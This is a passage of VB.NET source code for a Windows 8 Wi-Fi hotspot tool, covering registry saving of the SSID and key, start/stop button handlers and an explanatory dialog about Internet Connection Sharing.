            WLANHotspotWriteRegKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WLANHotspot", True)
            If Not ssidTextBox.Text = WLANHotspotWriteRegKey.GetValue("SSID") Then
                WLANHotspotWriteRegKey.SetValue("SSID", ssidTextBox.Text)
            End If
            '------------------------------------------------------------------------------------------------
            If Not passwordTextBox.Text = WLANHotspotWriteRegKey.GetValue("Key") Then
                WLANHotspotWriteRegKey.SetValue("Key", passwordTextBox.Text)
            End If
        Catch
            StartUpRegistryCheck()
        End Try
    End Sub
    Private Sub CurrentRegistryWriteThread_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles CurrentRegistryWriteThread.DoWork
        WriteCurrentConfigToRegistry()
    End Sub
    Private Sub ConsoleThread_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles ConsoleThread.DoWork
        If startButton.Text = "&Start" Then
            ConnectFunction()
        ElseIf startButton.Text = "&Stop" Then
            DisconnectFunction()
        End If
    End Sub
    Private Sub startButton_Click(sender As Object, e As EventArgs) Handles startButton.Click
        BNChecker.Text = Environment.OSVersion.Version.Build.ToString
        If BNChecker.Text = "9200" Or BNChecker.Text = "9600" Then
            GoTo run
        Else
            MsgBox("Windows 8 or Windows 8.1 are only the supported operating systems for this program.", MsgBoxStyle.Critical, "Error...")
            Exit Sub
        End If
run:
        If start.Enabled = False Then
            MsgBox("You need to stop Wi-Fi Hotspot Without ICS before starting Wi-Fi Hotspot With ICS", MsgBoxStyle.Critical, "Error...")
            Exit Sub
        End If
        ConsoleThread.RunWorkerAsync()
    End Sub
    Private Sub refreshConnectionButton_Click(sender As Object, e As EventArgs) Handles refreshConnectionButton.Click
        IcsRefreshThread.RunWorkerAsync()
    End Sub
    Private Sub Form1_FormClosingFORWIFIHOTSPOTWITHICS(ByVal sender As Object, ByVal e As FormClosingEventArgs) Handles MyBase.FormClosing
        If startButton.Text = "&Stop" Then
            MsgBox("Stop Wi-Fi Hotspot With ICS before closing the program.", MsgBoxStyle.Critical, "Error...")
            e.Cancel = True
        End If
    End Sub
    Private Sub LinkLabel1_LinkClicked_1(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        MsgBox("ICS stands for 'Internet Connection Sharing' , This means that when you start Wi-Fi Hotspot With ICS , Devices which are connected to your Wi-Fi Hotspot can also access the internet , If you start Wi-Fi Hotspot Without ICS , Devices will be only on same network.", MsgBoxStyle.Information, "What is ICS...")
    End Sub
End Class
'END OF THE PROGRAM
'FOR ANY (BUGS/OPINIOINS/SUGGESTIONS) , CONTACT ME:-
'My E-Mail : davidsanculane@gmail.com